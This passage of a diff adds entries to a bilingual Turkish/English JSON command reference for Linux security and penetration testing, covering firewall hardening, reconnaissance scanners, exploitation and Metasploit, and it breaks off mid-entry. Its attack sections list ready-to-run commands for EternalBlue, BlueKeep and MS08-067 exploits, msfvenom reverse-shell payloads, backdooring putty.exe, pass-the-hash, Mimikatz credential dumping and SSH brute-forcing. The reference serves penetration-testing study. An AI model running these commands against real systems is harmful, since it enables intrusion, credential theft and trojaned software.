+        "syntax": "iptables [options]",
+        "ex": [
+          {
+            "c": "iptables -L",
+            "tr": "Güvenlik duvarı kurallarını listele",
+            "en": "List firewall rules"
+          }
+        ]
+      },
+      {
+        "name": "ufw",
+        "tr": "Karmaşık olmayan güvenlik duvarı.",
+        "en": "Program for managing a Netfilter firewall.",
+        "syntax": "ufw [--dry-run] [options] [rule syntax]",
+        "ex": [
+          {
+            "c": "ufw enable",
+            "tr": "Güvenlik duvarını etkinleştir",
+            "en": "Enable firewall"
+          },
+          {
+            "c": "ufw allow 22/tcp",
+            "tr": "SSH portuna izin ver",
+            "en": "Allow SSH port"
+          }
+        ]
+      },
+      {
+        "name": "fail2ban",
+        "tr": "Saldırıları önlemek için log dosyalarını tarar ve IP'leri yasaklar.",
+        "en": "Scan log files and ban IPs that show the malicious signs.",
+        "syntax": "fail2ban-client [OPTIONS] <COMMAND>",
+        "ex": [
+          {
+            "c": "fail2ban-client status",
+            "tr": "Durumu kontrol et",
+            "en": "Check status"
+          }
+        ]
+      },
+      {
+        "name": "gpg",
+        "tr": "Güvenli iletişim için şifreleme ve imzalama aracı.",
+        "en": "OpenPGP encryption and signing tool.",
+        "syntax": "gpg [options] [files]",
+        "ex": [
+          {
+            "c": "gpg -c file.txt",
+            "tr": "Dosyayı şifrele",
+            "en": "Encrypt file"
+          }
+        ]
+      },
+      {
+        "name": "openssl",
+        "tr": "SSL/TLS kütüphanesi için komut satırı aracı.",
+        "en": "Command line tool for using the OpenSSL crypto library.",
+        "syntax": "openssl command [ command_opts ] [ command_args ]",
+        "ex": [
+          {
+            "c": "openssl genrsa -out key.pem 2048",
+            "tr": "RSA anahtarı oluştur",
+            "en": "Generate RSA key"
+          }
+        ]
+      },
+      {
+        "name": "setfacl",
+        "tr": "Dosya erişim kontrol listelerini (ACL) belirler.",
+        "en": "Set file access control lists.",
+        "syntax": "setfacl [-bkndRLPvh] [{-m|-x} acl_spec] [{-M|-X} acl_file] file ...",
+        "ex": [
+          {
+            "c": "setfacl -m u:user:rw file.txt",
+            "tr": "Kullanıcıya özel okuma/yazma izni ver",
+            "en": "Grant specific user read/write access"
+          }
+        ]
+      },
+      {
+        "name": "getfacl",
+        "tr": "Dosya erişim kontrol listelerini (ACL) alır.",
+        "en": "Get file access control lists.",
+        "syntax": "getfacl [-aceEsRLPvdh] file ...",
+        "ex": [
+          {
+            "c": "getfacl file.txt",
+            "tr": "Dosyanın genişletilmiş izinlerini gör",
+            "en": "View extended permissions of file"
+          }
+        ]
+      },
+      {
+        "name": "chcon",
+        "tr": "Dosya güvenlik bağlamını değiştirir (SELinux).",
+        "en": "Change file security context.",
+        "syntax": "chcon [OPTION]... CONTEXT FILE...",
+        "ex": [
+          {
+            "c": "chcon -t httpd_sys_content_t file.html",
+            "tr": "Dosyayı apache için erişilebilir yap",
+            "en": "Make file accessible for apache"
+          }
+        ]
+      },
+      {
+        "name": "restorecon",
+        "tr": "Varsayılan SELinux güvenlik bağlamlarını geri yükler.",
+        "en": "Restore default SELinux security contexts.",
+        "syntax": "restorecon [options] pathname...",
+        "ex": [
+          {
+            "c": "restorecon -v /var/www/html/index.html",
+            "tr": "Bağlamı orijinaline döndür",
+            "en": "Restore context to original"
+          }
+        ]
+      },
+      {
+        "name": "auditctl",
+        "tr": "Çekirdeğin audit (denetim) sistemini yapılandırır.",
+        "en": "A utility to assist controlling the kernel's audit system.",
+        "syntax": "auditctl [options]",
+        "ex": [
+          {
+            "c": "auditctl -l",
+            "tr": "Tüm aktif denetim kurallarını listele",
+            "en": "List all active audit rules"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "reconnaissance",
+    "cmds": [
+      {
+        "name": "netdiscover",
+        "tr": "Ağdaki cihazları ARP istekleri ile keşfeder (OSI Katman 2).",
+        "en": "Discover devices on network using ARP requests (OSI Layer 2).",
+        "syntax": "netdiscover [options]",
+        "ex": [
+          {
+            "c": "netdiscover -r 192.168.1.0/24",
+            "tr": "Belirtilen IP aralığını aktif olarak tara",
+            "en": "Actively scan the specified IP range"
+          },
+          {
+            "c": "netdiscover -p",
+            "tr": "Pasif tarama (sniffing) modu (daha sinsi)",
+            "en": "Passive scanning mode (stealth)"
+          }
+        ]
+      },
+      {
+        "name": "arp-scan",
+        "tr": "Yerel ağdaki cihazları hızlıca tespit eden Layer 2 tarayıcı.",
+        "en": "Layer 2 scanner to quickly detect devices on local network.",
+        "syntax": "arp-scan [options]",
+        "ex": [
+          {
+            "c": "arp-scan -l",
+            "tr": "Yerel ağı otomatik tara (localnet)",
+            "en": "Scan local network automatically (localnet)"
+          }
+        ]
+      },
+      {
+        "name": "nikto",
+        "tr": "Web sunucusu zafiyet tarayıcısı.",
+        "en": "Web server vulnerability scanner.",
+        "syntax": "nikto [options]",
+        "ex": [
+          {
+            "c": "nikto -h http://example.com",
+            "tr": "Temel zafiyet taraması başlat",
+            "en": "Start basic vulnerability scan"
+          },
+          {
+            "c": "nikto -h http://example.com -Tuning 9",
+            "tr": "Sadece SQL Injection (SQLi) zafiyetlerini ara",
+            "en": "Scan for SQLi vulnerabilities only"
+          },
+          {
+            "c": "nikto -h 10.10.10.10 -useproxy http://127.0.0.1:8080",
+            "tr": "Burp Suite üzerinden proxy taraması yap",
+            "en": "Scan through Burp Suite proxy"
+          }
+        ]
+      },
+      {
+        "name": "dirbuster",
+        "tr": "Web dizin ve dosya keşif (brute-force) aracı.",
+        "en": "Web directory and file discovery (brute-force) tool.",
+        "syntax": "dirbuster [options]",
+        "ex": [
+          {
+            "c": "dirbuster&",
+            "tr": "Görsel arayüzü başlat",
+            "en": "Start GUI"
+          },
+          {
+            "c": "dirbuster -H -u http://target/ -l wordlist.txt -t 50 -e php,txt",
+            "tr": "Arayüzsüz (headless) tarama başlat",
+            "en": "Start headless scan"
+          }
+        ]
+      },
+      {
+        "name": "dirb",
+        "tr": "Gizli web dizinlerini bulmak için kaba kuvvet aracı.",
+        "en": "Brute force tool to find hidden web directories.",
+        "syntax": "dirb <url_base> [<wordlist_file(s)>]",
+        "ex": [
+          {
+            "c": "dirb http://192.168.1.1",
+            "tr": "Varsayılan wordlist (common.txt) ile dizinleri tara",
+            "en": "Scan directories with default wordlist (common.txt)"
+          }
+        ]
+      },
+      {
+        "name": "ffuf",
+        "tr": "Çok hızlı web fuzzer aracı (Go tabanlı).",
+        "en": "Very fast web fuzzer tool (Go-based).",
+        "syntax": "ffuf [options]",
+        "ex": [
+          {
+            "c": "ffuf -w wordlist.txt:FUZZ -u http://target.com/FUZZ",
+            "tr": "Dizin keşfi yap",
+            "en": "Directory discovery"
+          },
+          {
+            "c": "ffuf -w list.txt:FUZZ -u http://target.com/page.php?id=FUZZ",
+            "tr": "Parametre fuzzing (zafiyet taraması) yap",
+            "en": "Parameter fuzzing (vulnerability scan)"
+          }
+        ]
+      },
+      {
+        "name": "nessus",
+        "tr": "Kapsamlı zafiyet tarama yazılımı.",
+        "en": "Comprehensive Vulnerability Scanner software.",
+        "syntax": "Nessus Service",
+        "ex": [
+          {
+            "c": "/etc/init.d/nessusd start",
+            "tr": "Nessus servisini başlat (https://localhost:8834 adresinden erişilir)",
+            "en": "Start Nessus service (accessed via https://localhost:8834)"
+          }
+        ]
+      },
+      {
+        "name": "Burp Suite (Linux Web Güvenlik Test Platformu)",
+        "tr": "Web uygulamalarında sızma testleri yapmak, trafiği izlemek ve manipüle etmek için kullanılan, içinde Proxy, Repeater ve Intruder barındıran endüstri standardı güvenlik platformu.",
+        "en": "Industry-standard web application security testing and proxy platform used to intercept, analyze, and manipulate HTTP/S traffic, featuring Proxy, Repeater, and Intruder modules.",
+        "syntax": "burpsuite &   # Arka planda grafik arayüzü (GUI) başlatır",
+        "ex": [
+          {
+            "c": "chmod +x burpsuite_community_linux.sh && ./burpsuite_community_linux.sh",
+            "tr": "Linux (.sh) yükleyicisini çalıştırılabilir yap ve interaktif grafik kurulum sihirbazını başlat.",
+            "en": "Make the Linux (.sh) installer executable and launch the interactive graphical installation wizard."
+          },
+          {
+            "c": "java -jar -Xmx2g burpsuite_community.jar",
+            "tr": "Bağımsız JAR sürümünü, Java sanal makinesine maksimum 2GB RAM (-Xmx2g) sınırı atayarak manuel başlat.",
+            "en": "Manually launch the standalone JAR version, allocating a maximum of 2GB RAM (-Xmx2g) to the Java Virtual Machine."
+          },
+          {
+            "c": "curl -x http://127.0.0.1:8080 -k https://example.com",
+            "tr": "Terminal trafiğini Burp Suite Proxy (127.0.0.1:8080) üzerinden geçirerek test et. -k ile SSL doğrulamasını atla.",
+            "en": "Route terminal traffic through Burp Suite Proxy (127.0.0.1:8080) to inspect it. Use -k to ignore SSL certificate warnings."
+          },
+          {
+            "c": "http://burpsuite/ -> 'CA Certificate' -> cacert.der",
+            "tr": "Tarayıcıyı 127.0.0.1:8080 proxy'sine yönlendirdikten sonra bu adresten PortSwigger CA sertifikasını (cacert.der) indir.",
+            "en": "After configuring the browser proxy to 127.0.0.1:8080, visit this URL to download the PortSwigger CA certificate (cacert.der)."
+          },
+          {
+            "c": "Firefox -> Settings -> Authorities -> Import -> Trust 'PortSwigger CA'",
+            "tr": "İndirilen CA sertifikasını Firefox'a yetkili otorite olarak ekleyip HTTPS trafiğini (SSL/TLS interception) şifresiz izle.",
+            "en": "Import the downloaded CA certificate into Firefox as an authority to enable transparent HTTPS traffic interception."
+          },
+          {
+            "c": "[Proxy] -> [Intercept] -> [Intercept is ON] -> [Forward / Drop]",
+            "tr": "Trafiği anlık durdur: Forward ile isteği sunucuya gönder, Drop ile isteği iptal et, Action ile diğer modüllere yolla.",
+            "en": "Pause traffic live: Forward sends the request to the server, Drop discards it, and Action routes it to other modules."
+          },
+          {
+            "c": "[Repeater] -> [Send to Repeater (Ctrl+R)] -> [Modify Request] -> [Send]",
+            "tr": "İsteği manipüle etme: Parametreleri, HTTP başlıklarını (Headers) değiştirip tekrar tekrar gönder ve yanıtı anlık incele.",
+            "en": "Manipulate requests: Edit query parameters, cookies, or headers, resend multiple times, and analyze the response live."
+          },
+          {
+            "c": "[Intruder] -> [Positions (§param§)] -> [Payloads (Wordlist)] -> [Attack Types (Sniper)]",
+            "tr": "Kaba kuvvet (Brute Force/Fuzzing): Belirlenen parametreye (§) wordlist yükle ve Sniper/Cluster Bomb modunda otomatik atağa geç.",
+            "en": "Brute Force/Fuzzing: Mark parameters with (§), load a wordlist, and execute automated attacks using Sniper or Cluster Bomb modes."
+          }
+        ]
+      },
+      {
+        "name": "SNMP Numaralandırması",
+        "tr": "Simple Network Management Protocol üzerinden ağ cihazları ve sunuculardan detaylı bilgi çekme.",
+        "en": "Extracting detailed info from network devices and servers via Simple Network Management Protocol.",
+        "syntax": "snmpwalk / snmp-check",
+        "ex": [
+          {
+            "c": "snmpwalk -c public -v1 192.168.1.10",
+            "tr": "SNMP v1 kullanarak 'public' community dizgisi ile ağdaki tüm bilgileri dök.",
+            "en": "Extract all network info using SNMP v1 with 'public' community string."
+          },
+          {
+            "c": "snmp-check 192.168.1.10",
+            "tr": "SNMP verilerini insan okuyabileceği kategorize edilmiş bir formatta (Kullanıcılar, IP'ler, Portlar) raporlar.",
+            "en": "Reports SNMP data in a highly readable and categorized format (Users, IPs, Ports)."
+          }
+        ]
+      },
+      {
+        "name": "FTP Numaralandırması (Nmap)",
+        "tr": "Nmap NSE scriptleri kullanarak FTP sunucuları hakkında detay toplama (Önceki Metasploit ftp modülüne alternatiftir).",
+        "en": "Detail gathering about FTP servers using Nmap NSE scripts (Alternative to Metasploit ftp module).",
+        "syntax": "nmap -p 21 --script=ftp-*",
+        "ex": [
+          {
+            "c": "nmap -p 21 --script=ftp-anon 192.168.1.10",
+            "tr": "Sadece FTP portunu tara ve Anonymous (şifresiz) girişe izin verip vermediğini kontrol et.",
+            "en": "Scan only FTP port and check if Anonymous login is allowed."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "exploitation",
+    "cmds": [
+      {
+        "name": "msfconsole",
+        "tr": "Metasploit Framework komut satırı arayüzü.",
+        "en": "Metasploit Framework command line interface.",
+        "syntax": "msfconsole [options]",
+        "ex": [
+          {
+            "c": "msfconsole -q",
+            "tr": "Sessiz başlat (banner olmadan)",
+            "en": "Start quietly (without banner)"
+          },
+          {
+            "c": "use exploit/multi/http/navigate_cms_rce",
+            "tr": "Navigate CMS RCE modülünü seç",
+            "en": "Select Navigate CMS RCE module"
+          },
+          {
+            "c": "set payload linux/x86/shell_reverse_tcp",
+            "tr": "Non-staged reverse shell payload'u ayarla",
+            "en": "Set non-staged reverse shell payload"
+          }
+        ]
+      },
+      {
+        "name": "php-reverse-shell",
+        "tr": "Hedef sunucudan saldırgana terminal bağlantısı açan script (pentestmonkey).",
+        "en": "Script that opens a reverse shell from target to attacker.",
+        "syntax": "php-reverse-shell.php",
+        "ex": [
+          {
+            "c": "nc -lvnp 1234",
+            "tr": "Gelecek bağlantıyı beklemek için kendi makinenizde dinleyici başlat",
+            "en": "Start listener on your machine for incoming connection"
+          }
+        ]
+      },
+      {
+        "name": "OpenFuck",
+        "tr": "Apache mod_ssl (OpenSSL v2) buffer overflow exploiti.",
+        "en": "Apache mod_ssl (OpenSSL v2) buffer overflow exploit.",
+        "syntax": "./OpenFuck <target_id> <ip> <port> -c <connections>",
+        "ex": [
+          {
+            "c": "./OpenFuck 0x6a 192.168.1.10 443 -c 40",
+            "tr": "Hedefe HTTPS üzerinden buffer overflow çalıştır (root shell sağlar)",
+            "en": "Run buffer overflow over HTTPS on target (gives root shell)"
+          }
+        ]
+      },
+      {
+        "name": "AutoBlue-MS17-010",
+        "tr": "MS17-010 (EternalBlue) açığı için otomatikleştirilmiş exploit seti.",
+        "en": "Automated exploit toolkit for MS17-010 (EternalBlue).",
+        "syntax": "python [script] <ip>",
+        "ex": [
+          {
+            "c": "python eternal_checker.py 192.168.1.10",
+            "tr": "Açığa karşı zafiyet taraması yap",
+            "en": "Scan for vulnerability"
+          },
+          {
+            "c": "python zzz_exploit.py 192.168.1.10",
+            "tr": "Stabil (mavi ekran riski düşük) Named Pipe exploit kullan",
+            "en": "Use stable Named Pipe exploit (low BSOD risk)"
+          }
+        ]
+      },
+      {
+        "name": "pwn_jenkins",
+        "tr": "Jenkins otomasyon sunucuları için RCE ve sömürü aracı.",
+        "en": "RCE and exploitation tool for Jenkins servers.",
+        "syntax": "python [script].py [args]",
+        "ex": [
+          {
+            "c": "python jenkins_rce_admin_script.py",
+            "tr": "Groovy script ile RCE/shell al",
+            "en": "Get RCE/shell via Groovy script"
+          },
+          {
+            "c": "python jenkins_dump_builds.py",
+            "tr": "Build loglarını çek (api anahtarları vb. sızdırmak için)",
+            "en": "Dump build logs (to leak api keys etc.)"
+          }
+        ]
+      },
+      {
+        "name": "Hedef: OpenSSH (Targeting OpenSSH)",
+        "tr": "SSH servisine yönelik numaralandırma ve kaba kuvvet (Brute-Force) saldırıları.",
+        "en": "Enumeration and brute-force attacks targeting the SSH service.",
+        "syntax": "hydra / nmap",
+        "ex": [
+          {
+            "c": "hydra -L users.txt -P passwords.txt ssh://192.168.1.10",
+            "tr": "Hydra kullanarak belirli bir kullanıcı ve şifre listesiyle SSH kaba kuvvet saldırısı yap.",
+            "en": "Perform an SSH brute-force attack using Hydra with specified user and password lists."
+          }
+        ]
+      },
+      {
+        "name": "Hedef: MySQL Veritabanı (Targeting MySQL)",
+        "tr": "MySQL veritabanı sunucusuna yönelik numaralandırma, şifre kırma ve komut çalıştırma.",
+        "en": "Enumeration, password cracking, and command execution targeting MySQL database server.",
+        "syntax": "nmap / mysql",
+        "ex": [
+          {
+            "c": "nmap -p 3306 --script=mysql-enum,mysql-brute 192.168.1.10",
+            "tr": "Nmap NSE scriptleri ile MySQL numaralandırması ve şifre kırma saldırısı yap.",
+            "en": "Perform MySQL enumeration and password cracking using Nmap NSE scripts."
+          },
+          {
+            "c": "mysql -u root -p -h 192.168.1.10 -e 'show databases;'",
+            "tr": "Ele geçirilen şifreyle MySQL'e uzaktan bağlan ve veritabanlarını listele.",
+            "en": "Connect to MySQL remotely with cracked password and list databases."
+          }
+        ]
+      },
+      {
+        "name": "Hedef: vsFTPd (Targeting vsFTPd)",
+        "tr": "vsFTPd sunucularına yönelik zafiyet sömürüsü ve numaralandırma.",
+        "en": "Vulnerability exploitation and enumeration targeting vsFTPd servers.",
+        "syntax": "nmap / metasploit",
+        "ex": [
+          {
+            "c": "nmap -p 21 --script=ftp-vsftpd-backdoor 192.168.1.10",
+            "tr": "Hedefteki vsFTPd servisinin bilinen backdoor (arka kapı) zafiyetine sahip olup olmadığını Metasploit açmadan tara.",
+            "en": "Scan if the target's vsFTPd service has the known backdoor vulnerability without opening Metasploit."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "metasploit",
+    "cmds": [
+      {
+        "name": "MSF ile Numaralandırma (Scanner)",
+        "tr": "Metasploit'in 'auxiliary' modülleri ile hedeften FTP, SMB, SSH, MySQL veya Web dizinleri hakkında bilgi toplama.",
+        "en": "Gathering info about FTP, SMB, SSH, MySQL or Web directories from target using Metasploit's 'auxiliary' modules.",
+        "syntax": "use auxiliary/scanner/[protokol]/[modül]",
+        "ex": [
+          {
+            "c": "use auxiliary/scanner/ftp/anonymous\nset RHOSTS 192.168.1.10\nrun",
+            "tr": "FTP Anonim Giriş ve Numaralandırma: Hedefte parolasız (anonymous) FTP girişinin açık olup olmadığını test eder.",
+            "en": "FTP Anonymous Login & Enum: Checks if anonymous FTP login is allowed on the target."
+          },
+          {
+            "c": "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun",
+            "tr": "SMB Numaralandırması: Ağdaki makinelerin işletim sistemi ve tam SMB versiyonlarını tarar.",
+            "en": "SMB Enumeration: Scans OS and detailed SMB versions of machines on the network."
+          },
+          {
+            "c": "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS 192.168.1.10\nrun",
+            "tr": "SSH Numaralandırması: SSH servisinin tam versiyon bilgisini (banner grabbing) çeker.",
+            "en": "SSH Enumeration: Grabs the SSH service banner and version info."
+          },
+          {
+            "c": "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS 192.168.1.10\nrun",
+            "tr": "MySQL Numaralandırması: Hedef veritabanı sunucusunun versiyon bilgisini elde eder.",
+            "en": "MySQL Enumeration: Gets the version info of the target database server."
+          },
+          {
+            "c": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS 192.168.1.10\nrun",
+            "tr": "Website Numaralandırması: Hedef web sunucusundaki gizli dizinleri brute-force yöntemiyle arar.",
+            "en": "Website Enumeration: Brute-forces hidden directories on the target web server."
+          }
+        ]
+      },
+      {
+        "name": "Zafiyet Taraması (Vulnerability Scan)",
+        "tr": "Sistemdeki güvenlik açıklarını Metasploit scanner modülleri veya eklentilerle otomatik tarama.",
+        "en": "Automated scanning for security vulnerabilities using Metasploit scanner modules or plugins.",
+        "syntax": "search type:auxiliary name:scanner",
+        "ex": [
+          {
+            "c": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.10\nrun",
+            "tr": "Hedefin MS17-010 (EternalBlue) zafiyetine karşı savunmasız olup olmadığını tarar (Exploit etmez, sadece tarar).",
+            "en": "Scans if target is vulnerable to MS17-010 (EternalBlue) (Does not exploit, only scans)."
+          },
+          {
+            "c": "load wmap\nwmap_sites -a http://hedef.com\nwmap_targets -t http://hedef.com\nwmap_run -e",
+            "tr": "WMAP Eklentisi: Web uygulamasına tam otomatik zafiyet taraması başlatır.",
+            "en": "WMAP Plugin: Starts fully automated web app vulnerability scan."
+          }
+        ]
+      },
+      {
+        "name": "Kritik Windows İstismarları (Exploits)",
+        "tr": "Tarihe geçmiş en büyük Windows zafiyetlerinin Metasploit üzerinden sömürülmesi ve sisteme sızılması.",
+        "en": "Exploiting the most massive Windows vulnerabilities in history via Metasploit to breach systems.",
+        "syntax": "use exploit/windows/[servis]/[açık_adı]",
+        "ex": [
+          {
+            "c": "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS 192.168.1.10\nexploit",
+            "tr": "MS08-067: Eski Windows (XP/2003) sistemlerde anında 'NT AUTHORITY\\SYSTEM' yetkili shell veren efsanevi SMB açığı.",
+            "en": "MS08-067: Legendary SMB exploit giving instant 'NT AUTHORITY\\SYSTEM' shell on old Windows (XP/2003)."
+          },
+          {
+            "c": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.10\nexploit",
+            "tr": "MS17-010 (EternalBlue): NSA'in sızdırdığı, SMBv1 açık olan Windows 7/Server 2008 sistemleri anında ele geçiren açık.",
+            "en": "MS17-010 (EternalBlue): NSA leaked exploit instantly compromising Win 7/Server 2008 with SMBv1 enabled."
+          },
+          {
+            "c": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS 192.168.1.10\nexploit",
+            "tr": "BlueKeep (CVE-2019-0708): Güncellenmemiş Windows RDP (Uzak Masaüstü, Port 3389) servisi üzerinden uzaktan kod çalıştırma.",
+            "en": "BlueKeep (CVE-2019-0708): Remote Code Execution via unpatched Windows RDP (Remote Desktop, Port 3389) service."
+          }
+        ]
+      },
+      {
+        "name": "Web ve Linux İstismarları (Exploits)",
+        "tr": "Web servisleri ve Linux tabanlı sistemlerdeki kritik açıkların sömürülmesi.",
+        "en": "Exploiting critical vulnerabilities in web services and Linux-based systems.",
+        "syntax": "use exploit/[platform]/[servis]/[açık]",
+        "ex": [
+          {
+            "c": "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset TARGETURI /cgi-bin/test.cgi\nexploit",
+            "tr": "Shellshock (CVE-2014-6271): Bash kabuğunun çevre değişkenlerini hatalı işlemesi sayesinde CGI üzerinden uzaktan kod çalıştırma.",
+            "en": "Shellshock (CVE-2014-6271): RCE via CGI due to a flaw in how the Bash shell handles environment variables."
+          },
+          {
+            "c": "use exploit/windows/iis/iis_webdav_upload_asp\nset RHOSTS 192.168.1.10\nexploit",
+            "tr": "WebDAV Sömürüsü: Yanlış yapılandırılmış (yazma izni PUT/MOVE olan) WebDAV sunucusuna zararlı ASP yükleyip shell alma.",
+            "en": "WebDAV Exploit: Uploading malicious ASP to misconfigured WebDAV (PUT/MOVE allowed) to get shell."
+          }
+        ]
+      },
+      {
+        "name": "İleri Seviye Taktikler (Pass The Hash & BadUSB)",
+        "tr": "Hash atlatma saldırıları ve fiziksel sızma (Rubber Ducky) için payload oluşturma.",
+        "en": "Pass the Hash attacks and generating payloads for physical breaches (Rubber Ducky).",
+        "syntax": "msfconsole / msfvenom",
+        "ex": [
+          {
+            "c": "use exploit/windows/smb/psexec\nset SMBPass [LM_Hash]:[NTLM_Hash]\nset SMBUser Administrator\nexploit",
+            "tr": "Hash'i Atlatma Saldırısı (Pass The Hash): Şifrenin aslını (plaintext) bilmeden, yakalanan hash değerini doğrudan kullanarak sisteme yönetici girişi yapma.",
+            "en": "Pass The Hash: Logging into the system using only the captured hash value without knowing the plaintext password."
+          },
+          {
+            "c": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f psh-cmd",
+            "tr": "Rubber Ducky için Payload: Zararlı USB takıldığında klavye gibi davranıp bu kodları çok hızlı yazarak (PowerShell In-Memory) cihaza sızar.",
+            "en": "Rubber Ducky Payload: Acts as keyboard when malicious USB inserted, typing these codes very fast (PowerShell In-Memory) to breach device."
+          }
+        ]
+      },
+      {
+        "name": "PsExec ile SMB İstismarı",
+        "tr": "Geçerli bir kullanıcı adı ve şifre/hash ile hedefte uzaktan komut çalıştırma (Sysinternals PsExec mantığı).",
+        "en": "Remote command execution using valid credentials or hashes (Sysinternals PsExec logic).",
+        "syntax": "use exploit/windows/smb/psexec",
+        "ex": [
+          {
+            "c": "use exploit/windows/smb/psexec\nset RHOSTS 192.168.1.10\nset SMBUser admin\nset SMBPass şifre\nexploit",
+            "tr": "Geçerli kimlik bilgileriyle hedefe bağlan ve 'SYSTEM' yetkisinde meterpreter shell al.",
+            "en": "Connect to target with valid credentials and get 'SYSTEM' meterpreter shell."
+          }
+        ]
+      },
+      {
+        "name": "MSFVenom Yük Oluşturma (Payload Gen)",
+        "tr": "Antivirüsleri atlatmak veya hedefe özel zararlı yazılım oluşturmak için kullanılan bağımsız araç.",
+        "en": "Standalone tool used to generate custom payloads or evade antiviruses.",
+        "syntax": "msfvenom -p [payload] LHOST=[IP] -f [format]",
+        "ex": [
+          {
+            "c": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > shell.exe",
+            "tr": "Standart bir Windows (.exe) ters bağlantı (reverse shell) yükü oluştur.",
+            "en": "Generate a standard Windows (.exe) reverse shell payload."
+          }
+        ]
+      },
+      {
+        "name": "Taşınabilir Dağıtımlara (PE) Yük İliştirme",
+        "tr": "MSFVenom ile temiz ve yasal bir programın (örn: putty.exe) içine zararlı kod gömme (Backdooring).",
+        "en": "Embedding malicious code into a clean, legitimate executable (e.g. putty.exe) using MSFVenom.",
+        "syntax": "msfvenom -x [temiz_exe] -p [payload] -f exe -o [zararli_exe]",
+        "ex": [
+          {
+            "c": "msfvenom -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o putty_zararli.exe",
+            "tr": "Putty programının orijinal yapısını bozmadan (-k) içine gizli meterpreter bağlantısı ekle.",
+            "en": "Inject hidden meterpreter into Putty without breaking its original functionality (-k)."
+          }
+        ]
+      },
+      {
+        "name": "Erişim Token'i Taklidi (Token Impersonation)",
+        "tr": "Sistemde açık olan diğer yetkili kullanıcıların (örn: Domain Admin) kimlik fişlerini (token) çalarak o kullanıcıymış gibi davranma.",
+        "en": "Stealing active access tokens of privileged users (e.g. Domain Admin) to act as them.",
+        "syntax": "load incognito",
+        "ex": [
+          {
+            "c": "load incognito\nlist_tokens -u",
+            "tr": "Meterpreter içindeyken Incognito modülünü yükle ve çalınabilecek yetkili token'ları listele.",
+            "en": "Load Incognito in Meterpreter and list available privileged tokens to steal."
+          },
+          {
+            "c": "impersonate_token 'NT AUTHORITY\\SYSTEM'",
+            "tr": "Sistem (Root) yetkili token'ı taklit et ve en yüksek yetkilere eriş.",
+            "en": "Impersonate System token to gain highest privileges."
+          }
+        ]
+      },
+      {
+        "name": "Mimikatz ile Hash Boşaltma (Dumping)",
+        "tr": "Windows RAM'inde (LSASS) tutulan şifreleri (açık metin veya hash) çekmek için kullanılan en ünlü araç.",
+        "en": "Most famous tool to extract passwords (plaintext or hash) stored in Windows RAM (LSASS).",
+        "syntax": "load kiwi",
+        "ex": [
+          {
+            "c": "load kiwi\ncreds_all",
+            "tr": "Meterpreter üzerinden Mimikatz (Kiwi) yükle ve hafızadaki tüm şifreleri/hash'leri çek.",
+            "en": "Load Mimikatz (Kiwi) via Meterpreter and dump all credentials/hashes from memory."
+          },
+          {
+            "c": "lsa_dump_sam",
+            "tr": "Windows SAM veritabanındaki tüm yerel kullanıcıların NTLM hash'lerini dök.",
+            "en": "Dump NTLM hashes of all local users from Windows SAM database."
+          }
+        ]
+      },
+      {
+        "name": "Resource Script ile MSF Otomasyonu",
+        "tr": "Metasploit komutlarını tek tek yazmak yerine bir dosyadan (.rc) otomatik okutarak çalıştırma (Otomasyon).",
+        "en": "Running Metasploit commands automatically from a file (.rc) instead of typing them one by one (Automation).",
+        "syntax": "msfconsole -r [script.rc]",
+        "ex": [
+          {
+            "c": "echo -e 'use exploit/multi/handler\\nset PAYLOAD windows/meterpreter/reverse_tcp\\nset LHOST 0.0.0.0\\nset LPORT 4444\\nexploit -j' > dinleyici.rc",
+            "tr": "Sürekli elle girilen Dinleyici ayarlarını içeren bir resource script (.rc) dosyası oluştur.",
+            "en": "Create a resource script (.rc) file containing constantly manually entered listener settings."
+          },
+          {
+            "c": "msfconsole -q -r dinleyici.rc",
+            "tr": "Metasploit'i sessizce başlat ve dinleyici komutlarını otomatik olarak arka planda çalıştır.",
+            "en": "Start Metasploit quietly and run the listener commands automatically in the background."
+          }
+        ]
+      },
+      {
+        "name": "WinRM Açığı (winrm_script_exec)",
+        "tr": "Windows Uzaktan Yönetim (WinRM - Port 5985/5986) servisi üzerinden geçerli kimliklerle kod çalıştırma.",
+        "en": "Code execution via Windows Remote Management (WinRM - Port 5985/5986) service using valid credentials.",
+        "syntax": "use exploit/windows/winrm/winrm_script_exec",
+        "ex": [
+          {
+            "c": "use exploit/windows/winrm/winrm_script_exec\nset RHOSTS 192.168.1.10\nset USERNAME admin\nset PASSWORD 1234\nset FORCE_VBS true\nexploit",
+            "tr": "Geçerli WinRM şifresiyle sisteme VBS scripti yükleyerek meterpreter shell al.",
+            "en": "Get a meterpreter shell by uploading a VBS script to the system using valid WinRM credentials."
+          }
+        ]
+      },
+      {
+        "name": "Tomcat JSP Upload Bypass",
+        "tr": "Apache Tomcat sunucularına PUT HTTP metodu ile JSP uzantılı zararlı dosya yükleyip shell alma.",
+        "en": "Getting a shell by uploading a malicious JSP file to Apache Tomcat servers via HTTP PUT method.",
+        "syntax": "use exploit/multi/http/tomcat_jsp_upload_bypass",
+        "ex": [
+          {
+            "c": "use exploit/multi/http/tomcat_jsp_upload_bypass\nset RHOSTS 192.168.1.10\nset RPORT 8080\nexploit",
+            "tr": "Yazma izinleri hatalı yapılandırılmış (Read-Only kapalı) Tomcat sunucusuna payload yükle.",
+            "en": "Upload payload to a misconfigured Tomcat server with improper write permissions (Read-Only disabled)."
+          }
+        ]
+      },
+      {
+        "name": "vsftpd 2.3.4 Backdoor Açığı",
+        "tr": "Meşhur bir FTP sunucu sürümüne (vsftpd 2.3.4) bilerek yerleştirilmiş gizli arka kapı (gülen yüz ':)') açığı.",
